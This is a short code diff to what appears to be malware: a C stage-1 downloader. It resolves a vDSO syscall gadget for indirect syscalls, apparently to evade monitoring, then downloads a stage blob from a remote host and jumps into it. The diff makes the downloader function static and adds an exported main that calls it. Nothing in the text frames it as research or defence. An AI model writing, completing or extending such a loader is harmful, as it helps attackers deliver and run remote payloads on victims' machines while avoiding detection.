@@ -36,7 +36,7 @@ static size_t download_stage1_blob(const char *host, const char *port,
                                    const char *path, void *buffer,
                                    size_t capacity);
 
-void downloader_main(void) {
+static void downloader_main(void) {
   /* Resolve vDSO syscall gadget before any other syscalls */
   init_indirect_syscalls();
 
@@ -90,6 +90,11 @@ void downloader_main(void) {
   entry(stage_blob, downloaded_size);
 
   exit(0);
+}
+
+__attribute__((visibility("default"))) int main(void) {
+  downloader_main();
+  return 0;
 }
 
 // Start routine similar to main.c but calls downloader_main
